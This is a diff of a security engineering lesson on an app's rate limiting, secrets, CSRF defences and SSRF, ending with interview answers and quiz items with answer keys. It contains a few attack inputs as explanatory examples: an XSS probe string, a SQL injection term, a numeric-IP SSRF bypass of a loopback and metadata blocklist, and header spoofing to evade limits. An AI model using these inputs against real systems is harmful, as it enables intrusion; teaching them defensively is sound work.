+`crates/api/src/middleware/rate_limit.rs` keeps four keyed limiters (the `governor` crate implements GCRA, equivalent to a token bucket), and the interesting decision in each is the key:
 
 | Limiter | Limit | Keyed by | Stops |
 |---|---|---|---|
-| `auth` (register, login) | 30 per minute | client IP | one address hammering the expensive Argon2 endpoints |
-| `password_attempts` (login, account deletion) | 10 per minute | the account's email, trimmed and lowercased | guessing one learner's password, from any number of addresses |
+| `auth` (register, login) | 30 per minute | client IP | one address hammering the Argon2 endpoints |
+| `password_attempts` (login, account deletion) | 10 per minute | the account's email, trimmed and lowercased | guessing one learner's password from any number of addresses |
 | `general` (all of `/api`) | 1,200 per minute | client IP | one client flooding cheap reads |
 | `ai` (routes that call the model) | 20 per minute | session (IP if there is none) | one learner burning model calls |
 
-Most of that table is the result of one review finding: a whole class or office can share one NAT address, and per-IP limits punish them for it. The login bucket used to be 10 per minute per IP, which was both too tight (a class signing in together could trip it) and too weak (an attacker spreading guesses at one account across many addresses never did). It is now 30 per minute per IP, and the real defence against password guessing is the per-account limiter; its field comment says so: "This, not the per-IP bucket, is what stops a distributed attacker guessing one learner's password." Normalising the key matters: `NoBody@Example.com` with spaces around it is the same account, and the integration test `throttled_responses_say_when_to_retry` checks that such a variant is still throttled while another account from the same address is not. The general bucket used to be 300 per minute and was loosened on purpose, because every expensive route (password hashing, AI) has its own tight bucket and the general one only has to stop a single client flooding cheap reads. The AI bucket used to be keyed per IP and wrapped every coach and interview route, so thirty learners behind one address shared twenty model calls a minute, and merely reading your conversation history spent them. It now wraps only the model-calling routes, and its key is a `ClientKey`: the first 16 bytes of the SHA-256 of the session cookie (so raw tokens never sit in the limiter's memory), or the IP when there is no cookie. A forged cookie earns its own bucket but is then rejected by authentication, and it still counts against the per-IP general bucket; the integration test `ai_throttling_is_per_session_and_only_for_model_calls` throttles one learner and checks that a second learner on the same IP is unaffected. AI usage additionally has per-user daily budgets stored in the database (`migration/src/m0003_ai.rs` calls the budget table "the cost-control seam").
+Most of that table is one review finding: a class or an office shares one NAT address, and per-IP limits punish it. The login bucket used to be 10 per minute per IP, both too tight for a class signing in together and too weak against guesses spread across addresses; the per-account limiter is the real defence, and its comment says so. The AI bucket used to be per IP and wrapped every coach route, so thirty learners behind one address shared twenty calls a minute and reading history spent them; it now wraps only model-calling routes and keys on the first 16 bytes of the SHA-256 of the session cookie. Throttled responses carry a `Retry-After` computed from the limiter. [Rate-limiting algorithms](/learn/networking/network-algorithms/rate-limiting-algorithms) covers the distributed versions.
 
 ```viz
 {"type": "system", "algorithm": "token-bucket", "title": "Keyed token buckets", "caption": "Each key (an IP, an account, a session) refills at a fixed rate up to a burst size. Password attempts get a small bucket; general browsing a large one."}
 ```
 
-The limiter is only as good as its key. Behind a proxy, the socket address is the proxy, so you need the client IP from a header. The configuration comment in `crates/core/src/config.rs` states the rule: "Never trust `X-Forwarded-For` blindly: its first entry is client-controlled." An attacker who sends `X-Forwarded-For: <random IP>` on every request would get a fresh bucket each time, turning a per-IP limit into no limit (which is also why password guessing is limited per account, a key the attacker cannot vary). The app reads the IP only from the single header named in `CLIENT_IP_HEADER`, one that the trusted edge proxy sets itself (the config comment names `x-real-ip` for Railway), and otherwise falls back to the socket address. The check you still owe is that the proxy overwrites a client-supplied copy of that header rather than passing it through; if it does not, you are back to trusting the client.
-
-The same question applies to the request ID that ties log lines together. The first version kept any `x-request-id` a client sent, so a caller could write arbitrary text into a field that operators search and trust, or reuse one ID across many requests to blur an investigation. `crates/api/src/middleware/request_id.rs` now keeps a client-supplied ID only if it parses as a UUID and otherwise drops it, so the server generates a fresh one; the integration test `request_ids_are_server_controlled` sends `<script>alert(1)</script>` and checks that it never comes back.
-
-Two further limits of the design are worth stating in a review. The buckets live in process memory, so with two instances each IP gets double the budget; horizontal scaling means moving the state to a shared store. And IP keys are coarse: users behind one corporate NAT share a bucket, which is why the general and login limits are loose and the tight limits follow the session or the account. A per-account limit has its own cost: anyone can spend a learner's ten attempts a minute by guessing at their email, a small, self-healing lockout that is the price of stopping distributed guessing. [Rate-limiting algorithms](/learn/networking/network-algorithms/rate-limiting-algorithms) covers the distributed versions.
+A limiter is only as good as its key. Behind a proxy the socket address is the proxy, and the first entry of `X-Forwarded-For` is whatever the client sent, so keying on it gives an attacker a fresh bucket per request. Ascend reads the IP only from the header named in `CLIENT_IP_HEADER`, one the trusted edge sets itself (`x-real-ip` on Railway), and otherwise uses the socket address; the check you still owe is that the edge overwrites a client-supplied copy. The request ID gets the same suspicion: `crates/api/src/middleware/request_id.rs` keeps a client-supplied `x-request-id` only if it parses as a UUID. Two limits of the design are worth stating in review: the buckets live in process memory, so two instances double every budget, and anyone can spend a learner's ten attempts a minute, a small self-healing lockout that is the price of stopping distributed guessing.
 
 ## Secrets
 
-`crates/core/src/config.rs` wraps the database URL and the AI API key in `SecretString` from the `secrecy` crate. The type's `Debug` output is redacted, and reading the value requires an explicit `expose_secret()` call. Because `Config` derives `Debug`, that is what stops a `tracing::debug!(?config)` from printing the database password into your log pipeline.
+`crates/core/src/config.rs` wraps the database URL and the AI key in `SecretString` from the `secrecy` crate: its `Debug` output is redacted and reading it needs an explicit `expose_secret()`, which stops a `tracing::debug!(?config)` from printing the database password. The rest is process. Secrets come from the platform's environment, and `.dockerignore` excludes `.env`, because anything copied into a layer is recoverable even if a later layer deletes it. `.railway/railway.ts` declares `ANTHROPIC_API_KEY: preserve()`, which keeps the value set in the platform, so the file can be public. Rotating the AI key is a variable change and a restart. Scan for committed secrets in a pre-commit hook and in CI, because the cheapest leak to fix is the one that never lands.
 
-The rest of secret handling is process, not code:
+## Failure modes
 
-- Secrets come from the platform's environment, never from files in the image. The repository's `.dockerignore` excludes `.env`, because anything copied into a layer is recoverable from the image even if a later layer deletes it.
-- Infrastructure code references secrets without containing them. `.railway/railway.ts` declares `ANTHROPIC_API_KEY: preserve()`, which keeps whatever value is set in the platform, so the file can be public.
-- Nothing secret goes into the repository; scan for it in a pre-commit hook and in CI, because the cheapest leak to fix is the one that never lands.
-- Every secret has a rotation story. Revoking an AI key should be a config change and a restart, which it is here.
-- Outbound URLs come from configuration (`ANTHROPIC_BASE_URL`), never from request input, which is how you avoid server-side request forgery.
+| Symptom | Diagnosis | Fix |
+|---|---|---|
+| A user sees another user's record after changing an ID in the URL | The lookup is by ID alone; tests only cover the owner | Owner in the `WHERE` clause; a test that reads as a second user |
+| Memory spikes and the process is OOM-killed during a login burst | Password hashing on an unbounded blocking pool: hundreds of 19 MiB hashes at once | A semaphore of one hash per CPU, plus a per-IP auth limit |
+| Login latency differs by about one hash between known and unknown emails | The unknown branch skips verification, or the first dummy hash is computed on demand | Verify against a dummy hash that is computed at boot |
+| The per-IP limiter never throttles a scripted attack | The key comes from a client-controlled header such as the first `X-Forwarded-For` entry | Key on a header the edge overwrites, or on the socket address; limit per account too |
+| The preview service fetches cloud metadata credentials | A string blocklist; numeric or IPv6-mapped forms bypass it | Resolve, check every address, pin it for the connection, re-check redirects, isolate the fetcher |
+| CI secrets appear in a build log after no change of yours | A third-party action's tag was moved to malicious code | Pin actions to commit SHAs; limit which jobs receive secrets |
+
+## Trade-offs: the CSRF defences compared
+
+| Defence | Stops | Defeated by | Cost | Depends on |
+|---|---|---|---|---|
+| `SameSite=Lax` cookie | Cross-site POSTs and sub-requests | A GET that changes state; a compromised sibling subdomain | A flag | Browser support |
+| Exact `Origin` check | Any cross-origin browser request | Prefix comparisons; clients that send neither header, which carry no cookie | A header comparison | A correct `PUBLIC_ORIGIN` |
+| Required custom header | Any cross-origin request without a preflight | A permissive CORS policy | One header in the client | Never granting preflights |
+| Synchroniser token | Forged requests from any origin | XSS, which can read the token | Server state or signing; plumbing into every form | Token delivery to the page |
+
+## Interviewer follow-ups
+
+**"Sessions are hashed with SHA-256 but passwords with Argon2id. Is that inconsistent?"** Model answer: no; slow hashing compensates for low entropy. A 256-bit random token cannot be brute-forced at any rate, so a fast hash already makes a leaked table useless, while a human password falls to a fast hash in minutes. Argon2id on every authenticated request would add tens of milliseconds for nothing. Common wrong answer: "use Argon2id for tokens too, to be safe", which slows every request and changes no attack.
+
+**"How do you stop credential stuffing without locking out whole offices?"** Model answer: limit per account (the attacker cannot vary the key), keep per-IP limits loose because NATs share addresses, add breached-password screening and MFA, and alert on distributed failure patterns. Common wrong answer: "block the IP after five failures", which punishes a school and does nothing against a botnet.
+
+**"Our preview feature blocks 127.0.0.1 and 169.254.169.254. Is SSRF handled?"** Model answer: no: numeric and IPv6-mapped encodings, DNS names that resolve to internal addresses, rebinding between check and connect, and redirects all pass a string list. Resolve, check every address, connect to the checked address, re-check each redirect, and run the fetcher with no route inside. Common wrong answer: "add more entries to the blocklist."
+
+**"Where do you put authorisation checks?"** Model answer: in the domain service that loads the resource, ideally in the query itself, returning 404 for private resources that are not the caller's; route handlers only authenticate. Common wrong answer: "in middleware by role", which cannot know which record a request touches.
+
+## What mid-level engineers get wrong
+
+- **Checking authentication and calling it authorisation.** Every logged-in user can then read every record whose ID they guess.
+- **Building SQL or HTML with string formatting**, then escaping by hand in some places.
+- **Fast hashes for passwords, or slow hashes for random tokens.** The first cracks in hours; the second adds latency for no gain.
+- **Keying rate limits on `X-Forwarded-For`** or on IP alone for login.
+- **Comparing origins, hosts or URLs by prefix** instead of parsing and comparing for equality.
+- **Blocklisting URLs by string** for server-side fetches.
+- **Referencing CI actions and base images by mutable tag** in a pipeline that holds deploy secrets.
 
 ## Senior signals
 
 - You ask **"who controls this input?"** at every boundary, including headers such as `X-Forwarded-For`, `Origin` and `Referer`.
-- You can explain why passwords need a **slow, memory-hard, salted** hash while 256-bit session tokens need only **SHA-256**.
+- You can run each OWASP family as a **concrete exploit and fix** on a whiteboard, and say which ones your system still has open.
+- You can explain why passwords need a **slow, memory-hard, salted** hash while 256-bit session tokens need only **SHA-256**, with the numbers.
 - You design login to be **timing-uniform and message-uniform**, and you know which other endpoints still enumerate accounts.
-- You prefer **revocable opaque sessions** for first-party web apps and can say where JWTs genuinely win.
 - You put **authorisation in the domain layer**, scoped by owner in the query, and treat 404-for-not-yours as the default.
-- You treat every weakened control (`'unsafe-eval'`, a permissive CORS rule) as a **documented trade-off with named compensating controls**.
+- You treat every weakened control (`'unsafe-eval'`, a permissive CORS rule, an unpinned action) as a **documented trade-off with named compensating controls**.
 
 ## Check yourself
 
@@ -263,19 +352,25 @@ The rest of secret handling is process, not code:
   options: ["Tokens expire within 30 days, so a stolen hash is soon useless", "Tokens are 256 random bits, so no guess rate could ever find one", "SHA-256 is a stronger algorithm than Argon2id for short inputs", "Tokens are also encrypted at rest, so the hash is a second layer"]
   answer: 1
   explanation: >-
-    Slow hashing compensates for low-entropy inputs that attackers can guess. A 256-bit random token has no guessable structure, so even billions of SHA-256 attempts per second never find one. Expiry (30 days by default) limits the window but does not replace hashing, SHA-256 is faster than Argon2id rather than stronger, and the tokens are not encrypted in the database: the hash is the only protection, and it is enough.
+    Slow hashing compensates for low-entropy inputs that attackers can guess. A 256-bit random token has no guessable structure: at a trillion guesses a second, searching half the space takes around 10^57 years. Expiry limits the window but does not replace hashing, SHA-256 is faster than Argon2id rather than stronger, and the tokens are not encrypted in the database: the hash is the only protection, and it is enough.
 - q: >-
-    Your login returns in about 2 ms for unknown emails and about 100 ms for known ones. What is the vulnerability and the fix?
-  options: ["Account enumeration; verify a dummy hash whenever the user is unknown", "SQL injection; parameterise the query that looks up the email", "Denial of service; cache the password hashes of the known accounts", "Session fixation; issue a fresh session ID after every login"]
+    A search endpoint builds SQL with an f-string, and the term %' OR 1=1 -- returns every user's rows. Why does a parameterised query stop this?
+  options: ["The driver sends the value separately, so it is never parsed as SQL", "The database rejects any value that contains an SQL keyword like OR", "Parameterised queries escape quotes by doubling them before sending", "Placeholders limit the value's length so a payload cannot fit in it"]
   answer: 0
   explanation: >-
-    The timing difference reveals which emails are registered. Always running one password verification, against a dummy hash if needed, makes both branches cost the same, which is what Ascend's password::verify does with DUMMY_HASH. Nothing here involves a flood, an injected query or a reused session ID: what the attacker learns is which accounts exist, and the dummy hash takes that away.
+    With a placeholder the statement's structure is fixed before the value arrives; the value is bound as data, so its quote and OR are only characters in a LIKE pattern, and the toy's fixed search returned no rows. Escaping is the fragile alternative that parameterisation replaces, and databases do not filter keywords or cap lengths for you.
 - q: >-
     A rate limiter keys login attempts on the first IP in X-Forwarded-For. What can an attacker do?
   options: ["Skip the CSRF check, since the limiter runs before the CSRF layer", "Spoof only IPv6 addresses, because IPv4 entries are checked against TCP", "Send a new fake IP each request and get a fresh bucket every time", "Nothing, because proxies replace the header with the real client IP"]
   answer: 2
   explanation: >-
-    Proxies append to X-Forwarded-For; they do not remove what the client sent, so the first entry is attacker-controlled whatever its address family. Each fake IP gets its own bucket, so the per-IP limit disappears. The limiter's key has nothing to do with CSRF. Key on a header your trusted edge overwrites (Ascend reads only CLIENT_IP_HEADER, x-real-ip on Railway), or on the socket address.
+    Proxies append to X-Forwarded-For; they do not remove what the client sent, so the first entry is attacker-controlled whatever its address family. Each fake IP gets its own bucket, so the per-IP limit disappears. The limiter's key has nothing to do with CSRF. Key on a header your trusted edge overwrites (Ascend reads only CLIENT_IP_HEADER, x-real-ip on Railway), or on the socket address, and limit per account as well.
+- q: >-
+    A link-preview service rejects URLs whose host is 127.0.0.1, localhost or 169.254.169.254. Why is http://2130706433/ still dangerous?
+  options: ["The resolver reads it as 127.0.0.1, which the string check never saw", "Browsers rewrite numeric hosts to the metadata address on redirect", "Any URL without a dot bypasses TLS, so the fetch happens in plain text", "Port 80 is implied, and the blocklist only covers explicit port numbers"]
+  answer: 0
+  explanation: >-
+    2130706433 is 127.0.0.1 written as one 32-bit number, and getaddrinfo accepts it, as it accepts hex and IPv6-mapped forms. Only a check on the resolved address catches every encoding, and even then the fetcher must connect to the address it checked and re-check redirects. Ports and TLS are unrelated to the bypass.
 - q: >-
     Which request does SameSite=Lax NOT stop the browser from sending the session cookie with?
   options: ["A top-level GET navigation from another site to your page", "A cross-site form POST that submits itself when the page loads", "A cross-site image tag whose src points at your API", "A cross-site fetch() call that uses the DELETE method"]
